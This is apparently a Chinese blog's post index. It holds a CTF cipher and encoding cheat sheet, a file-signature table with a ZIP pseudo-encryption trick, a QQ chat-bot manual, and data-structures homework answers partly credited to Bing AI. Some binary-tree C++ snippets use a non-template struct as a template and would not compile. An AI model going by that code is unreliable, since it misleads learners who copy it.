零宽隐写：yuanfux.github.io\n特殊暗号类加密这类加密都是特征性比较强的，易辨别\n1、猪圈密码特点：只能对字母加解密并且符号无法复制，粘贴后会直接显示明文\n猪圈密码（亦称朱高密码、共济会暗号、共济会密码或共济会员密码），是一种以格子为基础的简单替代式密码，曾经是美国内战时盟军使用的密码，目前仅在密码教学、各种竞赛中使用。\nhttp://www.metools.info/code/c90.html\n2、与佛论禅**特点：就是你看不懂的佛语\n常用解密网站：http://www.keyfc.net/bbs/tools/tudoucode.aspx\n3、百家姓暗号特征：不要多说当你看到一串百家姓的时候多半就是这个暗号了\n当他解密的的时候前面会多一串固定字符\n常用解密网站：\nhttps://www.ahz0.com/bjx.html\nhttps://www.w168.net/anhao.html\nhttps://api.dujin.org/baijiaxing/\nhttps://www.ddosi.com/ah.html\n\n4、卡尔达诺栅格码特征：把明文伪装成垃圾邮件，看着这么多内容，其实我只是加密了admin\n常用解密网站：https://www.spammimic.com/\n5、莫尔斯电码特征：密文由不规律的.、/、-组成\n\n摩尔斯电码（Morse alphabet）（又译为摩斯电码）是一种时通时断的信号代码，这种信号代码通过不同的排列顺序来表达不同的英文字母、数字和标点符号等。\n由美国人摩尔斯（Samuel Finley Breese Morse）于1837年发明，为摩尔斯电报机的发明（1835年）提供了条件。\n摩尔密码加密的字符只有字符，数字，标点，不区分大小写，支持中文汉字\n中文摩斯加密解密：本工具摩尔密码加密是互联网上唯一一个可以对中文进行摩斯编码的工具。\n\n莫尔斯电码加密列表 | Morse Code List一、26个字母的莫尔斯电码加密\n\n\n字符\n电码符号\n字符\n电码符号\n字符\n电码符号\n字符\n电码符号\n\n\n\nA\n．━\nB\n━ ．．．\nC\n━ ．━ ．\nD\n━ ．．\n\n\nE\n．\nF\n．．━ ．\nG\n━ ━ ．\nH\n．．．．\n\n\nI\n．．\nJ\n．━ ━ ━\nK\n━ ．━\nL\n．━ ．．\n\n\nM\n━ ━\nN\n━ ．\nO\n━ ━ ━\nP\n．━ ━ ．\n\n\nQ\n━ ━ ．━\nR\n．━ ．\nS\n．．．\nT\n━\n\n\nU\n．．━\nV\n．．．━\nW\n．━ ━\nX\n━ ．．━\n\n\nY\n━ ．━ ━\nZ\n━ ━ ．．\n\n\n\n\n\n\n二、数字的莫尔斯电码加密\n\n\n字符\n电码符号\n字符\n电码符号\n字符\n电码符号\n字符\n电码符号\n\n\n\n0\n━ ━ ━ ━ ━\n1\n．━ ━ ━ ━\n2\n．．━ ━ ━\n3\n．．．━ ━\n\n\n4\n．．．．━\n5\n．．．．．\n6\n━ ．．．．\n7\n━ ━ ．．．\n\n\n8\n━ ━ ━ ．．\n9\n━ ━ ━ ━ ．\n\n\n\n\n\n\n三、标点符号的莫尔斯电码加密\n\n\n字符\n电码符号\n字符\n电码符号\n字符\n电码符号\n字符\n电码符号\n\n\n\n.\n．━ ．━ ．━\n:\n━ ━ ━ ．．．\n,\n━ ━ ．．━ ━\n;\n━ ．━ ．━ ．\n\n\n?\n．．━ ━ ．．\n&#x3D;\n━ ．．．━\n’\n．━ ━ ━ ━ ．\n&#x2F;\n━ ．．━ ．\n\n\n!\n━ ．━ ．━ ━\n━\n━ ．．．．━\n_\n．．━ ━ ．━\n“\n．━ ．．━ ．\n\n\n(\n━ ．━ ━ ．\n)\n━ ．━ ━ ．━\n$\n．．．━ ．．━\n&amp;\n． ．．．\n\n\n@\n．━ ━ ．━ ．\n\n\n\n\n\n\n\n\n常用解密网站：https://www.atool99.com/morse.php\n6、Quoted-Printable这种编码常用与邮件处理，只能对汉字进行编码，特征是&#x3D;加两个大写字母或数字组合\n常用解密网站：\nhttp://www.mxcz.net/tools/QuotedPrintable.aspx\n\n7、ROT13特征：它与凯撒密码差不多都是字母替换，你看到一句特别奇怪的语句可能就是它编码的\nROT13（回转13位，Template:lang，有时中间加了个减号称作ROT-13）是一种简易的置换暗码。它是一种在网路论坛用作隐藏八卦（spoiler）、妙句、谜题解答以及某些脏话的工具，目的是逃过版主或管理员的匆匆一瞥。 ROT13被描述成「杂志字谜上下颠倒解答的Usenet对等体」（Usenet equivalent of a magazine printing the answer to a quiz upside down.）Template:cite web ROT13也是过去在古罗马开发的凯撒加密的一种变体。\n常用解密网站：http://www.mxcz.net/tools/rot13.aspx\n8、文本加密为汉字特征：将明文加密成各种繁体字后面带俩等号\n它不仅可以加密成汉字，还可以加密成以下几种类型\n汉字 数字 字母 音乐符号 国际标 盲文 韩文 日文 文 彝文 头符号 花朵符号 俄文\n常用解密网站：https://www.qqxiuzi.cn/bianma/wenbenjiami.php\njs专用加密1、颜文字js加密特征：一堆颜文字构成的js代码，在F12中可直接解密执行\n常用解密网站：https://utf-8.jp/public/aaencode.html\n2、jother编码特征：只用! + ( ) [ ] &#123; &#125;这八个字符就能完成对任意字符串的编码。也可在F12中解密执行\n常用解密网站：http://tmxk.org/jother/\n3、JSFuck编码特征：与jother很像，只是少了&#123; &#125;\n常用解密网站：https://jsfuck.com/\n","categories":["CTF","Crypto"],"tags":["CTF","Crypto"]},{"title":"CTF文件头文件尾汇总","url":"/posts/4db76617.html","content":"\n转自https://blog.csdn.net/Ahuuua/article/details/109165473#/\n\n文件头文件尾汇总：\n\n\n\n文件类型\n文件头\n文件尾\n特征\n\n\n\nJPEG (jpg)\nFFD8FF\nFF D9\nÿØÿà\n\n\nPNG (png)\n89504E47\nAE 42 60 82\n.PNG…\n\n\nGIF (gif)\n47494638\n00 3B\nGIF89a\n\n\nZIP Archive (zip)\n504B0304\n50 4B\nPK..\n\n\nTIFF (tif)\n49492A00\n\n\n\n\nWindows Bitmap (bmp)\n424D\n\nBM\n\n\nRAR Archive (rar)\n52617221\n\nRar!…\n\n\nWave (wav)\n57415645\n\n\n\n\nAVI (avi)\n41564920\n\n\n\n\nMPEG (mpg)包含音频数据和视频数据\n000001BA\n\n\n\n\nMPEG (mpg)只包含视频数据\n000001B3\n\n\n\n\n7Z\n377ABCAF271C\n\n7z¼¯’\n\n\nCAD (dwg)\n41433130\n\n\n\n\nAdobe Photoshop (psd)\n38425053\n\n\n\n\nRich Text Format (rtf)\n7B5C727466\n\n\n\n\nXML (xml)\n3C3F786D6C\n\n\n\n\nHTML (html)\n68746D6C3E\n\n\n\n\nEmail [thorough only] (eml)\n44656C69766572792D646174653A\n\n\n\n\nOutlook Express (dbx)\nCFAD12FEC5FD746F\n\n\n\n\nOutlook (pst)\n2142444E\n\n\n\n\nMS Word&#x2F;Excel (xls.or.doc)\nD0CF11E0\n\n\n\n\nMS Access (mdb)\n5374616E64617264204A\n\n\n\n\nWordPerfect(wpd)\nFF575043\n\n\n\n\nAdobe Acrobat (pdf)\n255044462D312E\n\n%PDF\n\n\nQuicken (qdf)\nAC9EBD8F\n\n\n\n\nWindows Password (pwl)\nE3828596\n\n\n\n\nReal Audio (ram)\n2E7261FD\n\n\n\n\nReal Media (rm)\n2E524D46\n\n\n\n\nQuicktime (mov)\n6D6F6F76\n\n\n\n\nWindows Media (asf)\n3026B2758E66CF11\n\n\n\n\nMIDI (mid)\n4D546864\n\n\n\n\nWin PE\n4D5A\n\nMZ\n\n\nELF\n7F 45 4C 46\n\n.ELF\n\n\nVMDK\n4B 44 4D\n\nKDM\n\n\nJava-class\nCA FE BA BE\n\nÊþº¾\n\n\n另外附一些小知识：\nPNG (png)摘于：https://blog.csdn.net/bisword/article/details/2777121文件头：89504E47　　　　　　　　　　　　　　　　　　　　　　文件尾：AE 42 60 82PNG文件，我们会发现，文件的结尾12个字符看起来总应该是这样的：00 00 00 00 49 45 4E 44 AE 42 60 82不难明白，由于数据块结构的定义，IEND数据块的长度总是0（00 00 00 00，除非人为加入信息），数据标识总是IEND（49 45 4E 44），因此，CRC码也总是AE 42 60 82。\n\n\n给大家举个例子：\nPNG图像：321*332分辨率  321-&gt;00 00 01 41  332-&gt;00 00 01 4C (也可以搜索十六进制找到标志位)\n也可以根据位直接找到标志位，就是IHDR的后面4字节00 00 01 41为宽度 再后4字节00 00 01 4C为长度\n\n 89 50 4E 47 0D 0A 1A 0A 是PNG头部署名域，表示这是一个PNG图片00 00 00 0D 描述IHDR头部的大小。\nzip文件摘于：https://blog.csdn.net/qq_26187985/article/details/83654197\n压缩源文件数据区：50 4B 03 04：这是头文件标记压缩源文件目录区：50 4B 01 02：目录中文件文件头标记压缩源文件目录结束标志：50 4B 05 06：目录结束标记\n无加密压缩源文件数据区的全局加密应当为00 00  （504B0304两个bytes之后）4位二进制数&lt;&#x3D;&gt;1位十六进制数 16bit&lt;&#x3D;&gt;4位16进制且压缩源文件目录区的全局方式位标记应当为00 00（504B0304四个bytes之后）一个字节表示两个16进制数\n假加密压缩源文件数据区的全局加密应当为00 00且压缩源文件目录区的全局方式位标记应当为09 00\n真加密压缩源文件数据区的全局加密应当为09 00且压缩源文件目录区的全局方式位标记应当为09 00\n\n全局方式位标记的四个数字中只有第二个数字对其有影响，其它的不管为何值，都不影响它的加密属性！第二个数字为奇数时 –&gt;加密第二个数字为偶数时 –&gt;未加密意思是08 00也是未加密 可以改为00 02 04 06 08改为01 03 05 07 09会被加密\n","categories":["CTF","Misc"],"tags":["CTF","Misc"]},{"title":"ChatLearning————学群友说话使用手册","url":"/posts/edeaa258.html","content":"开始使用\nmirai-api-http 配置 http adapter ， singleMode 为 false 为了保证稳定性，请尽量使用mirai-api-http v2.3.3版本\n配置 data.json\n\n&#123; &quot;Key&quot;: &quot;xxxxx&quot;, // 在mirai-api-http中设置的密钥,若使用singleMode也不需要校验,设置为&quot;&quot;即可 &quot;host&quot;: &quot;127.0.0.1&quot;, // mirai-api-http中设置的地址（若设置成0.0.0.0，请填写127.0.0.1） &quot;port&quot;: &quot;8080&quot;, // mirai-api-http中设置的端口 &quot;qq&quot;: &quot;xxx&quot;,  // 在mirai登陆的QQ号 &quot;session&quot;: &quot;xxx&quot; // 无需修改&#125;\n\n\nWindows双击 ChatLearning.exe 直接运行\nLinux在cd到目录后使用./ChatLearning运行\nWin7或以下的32位系统(包括32位的Linux)则需下载Source包并确保Python版本≥3.6使用 pip install -r requirements.txt 安装依赖后运行 Chatmain.py\n\n\n首次使用在控制台使用 setadmin &lt;QQ号,多个请用空格隔开&gt; 设置管理员； blackfreq &lt;次数&gt; 设置黑名单容错次数\n\n指令控制台下可执行指令，发送 help 获取指令表；管理员在聊天环境下私聊bot执行指令时，加上指令前缀 ！ 或 !\n\n\n\n基本\n描述\n\n\n\nhelp\n指令表\n\n\ncheck\n查看词库的问答个数和属性设置\n\n\nadmin\n进入管理模式\n\n\nlearning \n开启&#x2F;关闭记录\n\n\nreply\n开启&#x2F;关闭回复\n\n\nvoicereply\n开启&#x2F;关闭文字转语音回复\n\n\nsetadmin  &lt;QQ&gt;\n设置管理员QQ号，有多个用空格隔开\n\n\n\n\n\n\n属性\n描述\n\n\n\nglobe\n开启&#x2F;关闭总词库\n\n\ncosmatch\n开启&#x2F;关闭问题余弦相似度计算\n\n\ncosmatch &lt;匹配率&gt;\n设定问题余弦相似度计算匹配率阈值\n\n\nblackfreq &lt;次数&gt;\n设置黑名单容错次数\n\n\nmerge &lt;单位/秒&gt;\n间隔多长时间合成一次总词库\n\n\nlearning &lt;单位/秒&gt;\n词库链间隔时间\n\n\ntypefreq &lt;消息类型&gt; &lt;次数&gt;\n为消息类型设置回复阈值\n\n\nvoicereply\n开启&#x2F;关闭文字转语音回复\n\n\nreply &lt;百分比&gt;\n回复概率，若没有触发也不会触发文字转语音\n\n\nreplywait &lt;基准时间&gt; &lt;浮动时间&gt;\n设置回复时的等待时间（基准时间±浮动时间）\n\n\nreplycd &lt;秒&gt;\n设置回复的冷却时间\n\n\nvoicereply  &lt;百分比&gt;\n文字转语音概率，若没有触发将会继续发送文字\n\n\n\n回复阈值：Bot获取到答案时，需要这个答案在词库中重复出现的次数大于或者等于这个阈值时，才会回复\n黑名单容错次数：根据你设置的敏感词，达到次数自动将对象拉入黑名单后，不记录此人所有的发言。\n全局模式：未启用全局模式时，每个群的词库独立且实时生效（分群词库），上一秒从群中收集到一个词，下一秒就可以在本群中回复这个词。开启全局模式后，bot将采用由所有分群词库定时合成的总词库回复\n词库链间隔时间：发消息后多长时间会进入空窗期，比如设置10s，一个人发完一条消息10s内没人继续说话，就会将10s后的第一条消息作为问，再下一条就是答，可能没什么卵用，毕竟群里经常上话不接下话，不在一个频道。\n问题余弦相似度计算：当词库中无该问题时，会启用相似度计算引擎，会将问题与词库中所有的问题进行相似度计算，选取匹配率最高的进行回答（该阈值可设定），较消耗计算机资源，斟酌开启\n\n\n\n\n群部分\n描述\n\n\n\ngrouplist\n查看开启记录&#x2F;回复的群列表\n\n\nadd/remove learning &lt;群号&gt;\n添加&#x2F;移除开启记录的群，有多个用空格隔开\n\n\nadd/remove learnings &lt;群号&gt;\n同时添加&#x2F;移除开启记录和回复的群，有多个用空格隔开\n\n\nadd/remove reply &lt;群号&gt;\n添加&#x2F;移除开启回复的群，有多个用空格隔开\n\n\nadd/remove tag &lt;标签&gt; &lt;群号&gt;\n添加&#x2F;移除群标签(移除时不需要带上标签参数)\n\n\nadd/remove subadmin &lt;群号&gt;\n添加&#x2F;移除可自行管理本群词库的群，有多个用空格隔开\n\n\nadd/remove unmerge &lt;群号&gt;\n添加&#x2F;移除不录入总词库的群，有多个用空格隔开\n\n\n\n群标签：群往往带有一些属性，例如xxx游戏群，xxx交流群，这时候可以为群添加相应的标签，在记录词库时，会记录在相应标签的词库内，这样在回复时，只会在相应标签词库内寻找答案，一个群可以拥有多个标签，支持中文\n\n\n\n\n文字转语音\n描述\n\n\n\nsetvoicept  &lt;训练集&gt;\n选择音源合成时的训练模型\n\n\nuploadwav\n上传音源文件\n\n\n\n\n\n快速删除\n描述\n\n\n\nfastdelete\n更改快速删除功能的使用权限\n\n\nsettemp &lt;条数&gt;\n设置单个群中消息缓存最大数目\n\n\n\n&#96;快速删除：在开启回复的群中，向Bot所发送的消息回复!d 、!delete 、！d 、！delete 即可在词库中删除该回复\n\n\n\n\n定时任务\n描述\n\n\n\nadd/remove autotask &lt;任务名称&gt;\n添加&#x2F;移除定时任务\n\n\nautotaskinfo\n查看定时任务详情\n\n\nautotaskcommand\n查看定时任务中的特殊指令\n\n\n定时任务\nChatLearning在2.9.5版本中加入了定时任务功能，可以自定义地定时执行ChatLearning中的指令\n注：若发现输入正确却无法解析内容，请检查txt文件编码是否为UTF-8\n&#x27;&#x27;&#x27;这是一个定时任务的模板，程序会自动解析带标记的行&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;请创建一个新的txt文件放置AutoTask文件夹下来自定义你的任务，文件名即是任务名&#x27;&#x27;&#x27;&#x27;&#x27;开头使用&quot;#&quot;来标记任务的执行日期&#x27;&#x27;如&quot;每日&quot;：#everyday或是&quot;周一 周日&quot;：#w1 w7还可以是&quot;每2天&quot;:#x2亦或是&quot;具体日期&quot;(不足十位请补0，如5→05)：#2022-08-30&#x27;&#x27;开头使用&quot;@&quot;来标记执行结果发送的QQ号&#x27;&#x27;如：@123456&#x27;&#x27;开头使用&quot;*&quot;来标记任务的执行时间&#x27;&#x27;如(请使用英文冒号哦，不足十位请补0，如5→05)：*05:05&#x27;&#x27;开头使用&quot;/&quot;来标记任务所需执行的指令&#x27;&#x27;如(一个指令对应一行)：/check/autodelete以下是示例（每天的12点和23点59分，按顺序执行check，grouplist指令，并将结果发送给123456）：#everyday@123456*12:00 23:59/check/grouplist-------------------在自动任务中有一些特殊指令：自动清理词库&quot;autodelete&quot;发送群消息&quot;sendgroupmessage &lt;群号&gt; &lt;消息&gt;&quot;发送群图片&quot;sendgroupmessageimage &lt;群号&gt; &lt;图片文件的绝对路径&gt;&quot;发送好友消息&quot;sendfriendmessage &lt;好友QQ&gt; &lt;消息&gt;&quot;发送好友图片&quot;sendfriendmessageimage &lt;好友QQ&gt; &lt;图片文件的绝对路径&gt;&quot;在&lt;消息&gt;这个参数中，可以附带一些指定的标记，程序会将这些标记替换成相应的结果：当前年：&#123;year&#125;当前月：&#123;month&#125;当前日：&#123;day&#125;换行：&#123;n&#125;如：/sendgroupmessage 123456 今天是&#123;year&#125;年&#123;month&#125;月&#123;day&#125;日！&#123;n&#125;大家好啊！-------------------\n\n\n\n管理模式\n词库管理：模糊 搜索/查看/删除 所有群/指定群 的词库\n过滤：自定义无用关键词，也可以通过在删除答案时前加add来直接添加进过滤列表\n黑名单：自定义敏感关键词，不记录且将对象拉入黑名单，用 blackfreq  自定义容错次数。\n自动清理词库：删除词库中仅出现过单次的条目和被过滤的条目\n添加定时任务：使用定时任务定义的语法添加定时任务\n添加自定义回复：为词库添加回复，问答皆可除视频、文件任意形式的消息(只要QQ能发出来)，同时为答案定义权重(词库中每个答案都有一个权重，意为答案出现过的次数)\n\n文字转语音ChatLearning—ToVoice\nQ&amp;AQ：ChatLearning的功能是什么？\nA：ChatLearning可以自动的从群聊中收集聊天记录，并且将这些聊天记录整理成一个问&amp;答的词库，当有人发送的消息与词库中的”问“匹配时，会从“答”中随机抽取其中一个回复在群聊中\n\nQ：打开软件后，我应该如何使用？\nA：首先应添加需要bot记录的群号，然后开启记录功能（输入help可查看到对应指令）\n\nQ：要收集多久bot才会开始回复呢？\nA：收集的时间完全由自己决定，理论上时间越久，效果会更好且更加有趣\n\nQ：我要怎么才能让bot回复？\nA：首先应添加需要bot回复的群号，然后开启回复功能（输入help可查看到对应指令）\n\nQ：目录下的.cl和.clc文件是什么，我可以删除它吗？\nA：.cl文件是ChatLearning所缓存在本地的词库，它的文件名就是所对应的QQ群号，如果你觉得不需要这个词库了，可以在ChatLearning退出后将它删除。.clc文件是ChatLearning的配置文件，删除后ChatLearning会随即崩溃\n\nQ：目录下的.cl文件太大太占空间了怎么办？\nA：一般来说不是每天都隔一会99+的群聊，是不会很占空间的， 目前只能选择进入管理模式手动清理一些不需要的回复，后续会更新根据记录的时间批量删除\n","categories":["QQbot"],"tags":["QQbot"]},{"title":"DS 作业-6-Ch5-22 网安物联网-20231024","url":"/posts/7e0c0400.html","content":"题目这次老师直接用PDF发题，我直接搬过来了，加密环境下图片加载不出来直接点开看\n\n题解题解懒得打字了，直接把图搬过来，除了最后两个题，前面题目不能保证准确率，因为是我自己做的\n第一题\n第二题\n第三题\n第四题\n第五题\n第六题这是一个使用递归的方法来计算二叉树中叶子节点的个数的算法。在这个算法中，我们首先检查当前节点是否为空，如果为空则返回0。然后，我们检查当前节点是否是叶子节点，如果是，则返回1。否则，我们递归地对左子树和右子树进行相同的操作，并将结果相加。\ntemplate &lt;typename DataType&gt;class BiTree &#123;public:    struct BiNode &#123;        DataType data;        BiNode* left;        BiNode* right;    &#125;;    int BiTreeLeaf(BiNode&lt;DataType&gt;* bt) &#123;        if (bt == nullptr) &#123;            return 0;        &#125;        if (bt-&gt;left == nullptr &amp;&amp; bt-&gt;right == nullptr) &#123;            return 1;        &#125;        return BiTreeLeaf(bt-&gt;left) + BiTreeLeaf(bt-&gt;right);    &#125;&#125;;\n\n这个函数BiTreeLeaf接收一个指向BiNode的指针作为参数，并返回一个整数，表示二叉树中叶子节点的个数。请注意，这个函数是BiTree类的成员函数，所以你需要在一个BiTree对象上调用它。例如，如果你有一个BiTree&lt;int&gt;对象tree，你可以这样调用它：tree.BiTreeLeaf(root)，其中root是指向树根的指针。这个函数会递归地遍历整棵树，并计算叶子节点的个数。当它访问到一个叶子节点时，它就会返回1；否则，它就会返回其左右子树中叶子节点的个数之和。这就是递归的魅力！\n第七题这是一个使用递归的方法来计算二叉树的深度的算法。在这个算法中，我们首先检查当前节点是否为空，如果为空则返回0。然后，我们递归地对左子树和右子树进行相同的操作，并返回结果中的最大值加1。\ntemplate &lt;typename DataType&gt;class BiTree &#123;public:    struct BiNode &#123;        DataType data;        BiNode* left;        BiNode* right;    &#125;;    int BiDepth(BiNode&lt;DataType&gt;* bt) &#123;        if (bt == nullptr) &#123;            return 0;        &#125;        int leftDepth = BiDepth(bt-&gt;left);        int rightDepth = BiDepth(bt-&gt;right);        return max(leftDepth, rightDepth) + 1;    &#125;&#125;;\n\n这个函数BiDepth接收一个指向BiNode的指针作为参数，并返回一个整数，表示二叉树的深度。请注意，这个函数是BiTree类的成员函数，所以你需要在一个BiTree对象上调用它。例如，如果你有一个BiTree&lt;int&gt;对象tree，你可以这样调用它：tree.BiDepth(root)，其中root是指向树根的指针。这个函数会递归地遍历整棵树，并计算树的深度。当它访问到一个节点时，它就会返回其左右子树中深度较大的一个加上1。这就是递归的魅力！\n","categories":["学习笔记","数据结构作业","课后作业"],"tags":["数据结构作业"]},{"title":"DS作业-2-22网安物联网-20230913","url":"/posts/cab65f6a.html","content":"\n声明：仅供留档查阅，仅用作起到提示引导性作用，仅用作学习交流，切勿直接照搬\n\nDS作业-2-22网安物联网-20230913作业Ch1-4:  P24-P25 1.选择题\n1-5  CD    B  B A A   6-9  C  CE  \n第九题解析\n\n这段代码的时间复杂度是O(n²)。这是因为外部循环会执行n次，而内部循环会执行2i次，其中i的最大值是n。因此，最坏情况下，内部循环会执行2n次。所以，总的执行次数是n(2n)，即O(n²)。这意味着，如果输入大小（即n的值）增加，那么执行时间将按平方增加。这是典型的二次时间复杂度的例子。\n\n作业Ch1-5:算法编程题，给出代码、测试过程和运行结果：\n这个题存疑，算法思路还没看懂\n将一个具有 n 个元素的数组A[n]向左循环移动k个位置，要求时间复杂度为O(n)，空间复杂度为O(1)。\n\n答案（来自bing ai\n\n这是一个经典的问题，可以通过三次反转数组的方法来解决。首先，我们将数组的前k个元素反转，然后将剩余的元素反转，最后将整个数组反转。这样就可以实现将数组向左循环移动k个位置。以下是具体的C++代码实现：\n#include&lt;iostream&gt;using namespace std;void reverse(int A[], int start, int end) &#123;    while(start &lt; end) &#123;        swap(A[start], A[end]);        start++;        end--;    &#125;&#125;void leftRotate(int A[], int n, int k) &#123;    reverse(A, 0, k-1);    reverse(A, k, n-1);    reverse(A, 0, n-1);&#125;int main() &#123;    int A[] = &#123;1, 2, 3, 4, 5, 6, 7&#125;;    int n = sizeof(A)/sizeof(A[0]);    int k = 2;        leftRotate(A, n, k);        for(int i = 0; i &lt; n; i++) &#123;        cout &lt;&lt; A[i] &lt;&lt; &quot; &quot;;    &#125;        return 0;&#125;\n\n这段代码首先定义了一个reverse函数，用于反转数组中从start到end的元素。然后定义了一个leftRotate函数，用于将数组向左循环移动k个位置。在main函数中，我们创建了一个数组，并调用了leftRotate函数来进行旋转。最后，我们打印出旋转后的数组。\n这个解决方案的时间复杂度为O(n)，空间复杂度为O(1)，满足了题目的要求。希望这个答案对你有所帮助！\n新知识，要使其不大于最大长度可以用取模运算来解决\n作业Ch1-6:算法编程题，给出代码、测试过程和运行结果：\n找出整型数组A[n]中的最大值和次最大值。\n\n答案（来自bing ai\n\n以下是一个C++代码片段，它可以找出整型数组A[n]中的最大值和次最大值。这个代码假设数组中至少有两个元素，并且所有元素都是唯一的。\n#include&lt;iostream&gt;using namespace std;void findMaxAndSecondMax(int A[], int n) &#123;    int max1 = A[0], max2 = A[0];    for(int i = 1; i &lt; n; i++) &#123;        if(A[i] &gt; max1) &#123;            max2 = max1;            max1 = A[i];        &#125; else if(A[i] &gt; max2) &#123;            max2 = A[i];        &#125;    &#125;    cout &lt;&lt; &quot;最大值: &quot; &lt;&lt; max1 &lt;&lt; &quot;, 次最大值: &quot; &lt;&lt; max2 &lt;&lt; endl;&#125;int main() &#123;    int A[] = &#123;1, 2, 3, 4, 5, 6, 7&#125;;    int n = sizeof(A)/sizeof(A[0]);        findMaxAndSecondMax(A, n);        return 0;&#125;\n\n这段代码首先定义了一个findMaxAndSecondMax函数，用于找出数组中的最大值和次最大值。然后在main函数中，我们创建了一个数组，并调用了findMaxAndSecondMax函数来找出最大值和次最大值。希望这个答案对你有所帮助！\nEND","categories":["学习笔记","数据结构作业","课后作业"],"tags":["数据结构作业"]},{"title":"DS作业-3-Ch2-22网安物联网-20230927","url":"/posts/bd11f2f0.html","content":"\n声明：仅供留档查阅，仅用作起到提示引导性作用，仅用作学习交流，切勿直接照搬\n\n作业Ch2-1:总结单链表中引入头节点的原因？\n为了使操作方便，加了头结点之后，无论单链表是否为空，头指针始终指向头节点，因此空表和非空表的处理也统一了\n作业Ch2-2:编程题目，逆置一个单链表为一个新表，编制源代码并运行。\n\n没用ai跑，自己写的，实际上原理就是头插法和尾插法，两个方法的顺序是相反的\n重做了，原来的做法不符题意，虽然功能是一样的，新做法的思路↓\n\n\nnizhi函数的原理是通过改变链表中节点的链接顺序来实现链表的反转。\n具体步骤如下：\n\n初始化：创建一个新的空链表（只有头节点，头节点的next指针为nullptr）。\n遍历原链表：从原链表的第一个节点开始，每次处理一个节点。\n插入新链表：将当前处理的节点插入到新链表的头节点之后。具体操作是先将当前节点的next指针指向新链表的第一个节点，然后再将头节点的next指针指向当前节点。\n移动到下一个节点：保存下一个要处理的节点的位置，然后将当前节点从原链表中断开（也就是将当前节点的next指针置为nullptr），最后移动到下一个要处理的节点。\n重复步骤3和4，直到原链表中所有的节点都被处理完毕。\n\n这样，原链表中的节点就被逐个移动到了新链表中，并且在新链表中的顺序与在原链表中的顺序相反，从而实现了链表的反转。这个过程中，我们没有创建任何新的节点，只是改变了已有节点之间的链接关系。因此，这个函数的时间复杂度为O(n)，空间复杂度为O(1)。\n\n#include &lt;iostream&gt;using namespace std;template&lt;typename DataType&gt;struct Node&#123;    DataType data;    Node&lt;DataType&gt;* next;&#125;;template&lt;typename DataType&gt;class linklist&#123;public:    linklist();    linklist(DataType a[], int n);    ~linklist();    void nizhi();    void display();private:    Node&lt;DataType&gt;* first;//头结点&#125;;template&lt;typename DataType&gt;linklist&lt;DataType&gt;::linklist()&#123;    first = new Node&lt;DataType&gt;;    first-&gt;next = nullptr;//头结点指针置空&#125;template &lt;typename DataType&gt;linklist&lt;DataType&gt;::linklist(DataType a[], int n)&#123;    first = new Node&lt;DataType&gt;;              // 生成头结点    Node&lt;DataType&gt;* r = first, * s = nullptr; // 尾指针初始化    for (int i = 0; i &lt; n; i++)    &#123;        s = new Node&lt;DataType&gt;;        s-&gt;data = a[i];        r-&gt;next = s;        r = s; // 将结点s插入到终端结点之后    &#125;    r-&gt;next = nullptr; // 单链表建立完毕，将终端结点的指针域置空&#125;template&lt;typename DataType&gt;void linklist&lt;DataType&gt;::nizhi()&#123;    Node&lt;DataType&gt;* p = first-&gt;next;    Node&lt;DataType&gt;* q;    first-&gt;next = nullptr;    while (p != nullptr)    &#123;        q = p-&gt;next; // 保存下一个节点的位置        p-&gt;next = first-&gt;next; // 将当前节点插入到头节点之后        first-&gt;next = p;        p = q; // 移动到下一个节点    &#125;&#125;template&lt;typename DataType&gt;void linklist&lt;DataType&gt;::display()&#123;    Node&lt;DataType&gt;* p = first-&gt;next;    while (p != nullptr)    &#123;        cout &lt;&lt; p-&gt;data &lt;&lt; &quot;\\t&quot;;        p = p-&gt;next;    &#125;&#125;template &lt;class DataType&gt;linklist&lt;DataType&gt;::~linklist()&#123;    Node&lt;DataType&gt;* q = NULL;    while (first != NULL) // 释放单链表的每一个结点的存储空间    &#123;        q = first;           // 暂存被释放结点        first = first-&gt;next; // first指向被释放结点的下一个结点        delete q;    &#125;&#125;    /*                   _ooOoo_                  o8888888o                  88&quot; . &quot;88                  (| -_- |)                  O\\  =  /O               ____/`---&#x27;\\____            .&#x27;  \\\\|     |//  `.            /  \\\\|||  :  |||//  \\           /  _||||| -:- |||||-  \\           |   | \\\\\\  -  /// |   |           | \\_|  &#x27;&#x27;\\---/&#x27;&#x27;  |   |           \\  .-\\__  `-`  ___/-. /         ___`. .&#x27;  /--.--\\  `. . __      .&quot;&quot; &#x27;&lt;  `.___\\_&lt;|&gt;_/___.&#x27;  &gt;&#x27;&quot;&quot;.     | | :  `- \\`.;`\\ _ /`;.`/ - ` : | |     \\  \\ `-.   \\_ __\\ /__ _/   .-` /  /======`-.____`-.___\\_____/___.-`____.-&#x27;======                   `=---=&#x27;^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^    佛祖保佑       永不宕机     永无BUG*/int main()&#123;    int maxsize;    cout &lt;&lt; &quot;请输入你要创建数组的大小&quot; &lt;&lt; endl;    cin &gt;&gt; maxsize;    int* a = new int[maxsize];    for (int i = 0; i &lt; maxsize; i++)    &#123;        a[i] = i + 1;    &#125;    cout &lt;&lt; &quot;已创建一个最大长度&quot; &lt;&lt; maxsize &lt;&lt; &quot;的链表&quot; &lt;&lt; endl;    linklist&lt;int&gt; L&#123; a, maxsize &#125;;    cout &lt;&lt; &quot;执行遍历链表&quot; &lt;&lt; endl;    L.display();    cout &lt;&lt; endl;    cout &lt;&lt; &quot;下面逆置最大长度为&quot; &lt;&lt; maxsize &lt;&lt; &quot;的链表&quot; &lt;&lt; endl;    L.nizhi();    L.display();    return 0;&#125;\n\n\n\n作业Ch2-3:教材P66, 2(1)题：请说明顺序表和单链表有何优缺点？并分析不同情况下采用何种存储结构更合适？\n顺序表的优点:① 无需为表示表中元素之间的逻辑关系而增加额外的存储空间;② 可以快速地存取表中任一位置的元素(即随机存取)。\n顺序表的缺点:① 插入和删除操作需移动大量元素;② 表的容量难以确定;③ 造成存储空间的“碎片”。\n单链表的优点:① 不必事先知道线性表的长度;② 插入和删除元素时只需修改指针,不用移动元素。\n单链表的缺点:① 指针的结构性开销;② 存取表中任意元素不方便,只能进行顺序存取。\n⑴ 应选用顺序存储结构。因为顺序表是随机存取结构,单链表是顺序存取结构。本题很少进行插入和删除操作,所以空间变化不大,且需要快速存取,所以应选用顺序存储结构。\n⑵ 应选用链接存储结构。链表容易实现表容量的扩充,适合表的长度动态发生变化。⑶ 应选用链接存储结构。因为一个城市的设计和规划涉及活动很多,需要经常修改、扩充和删除各种信息, 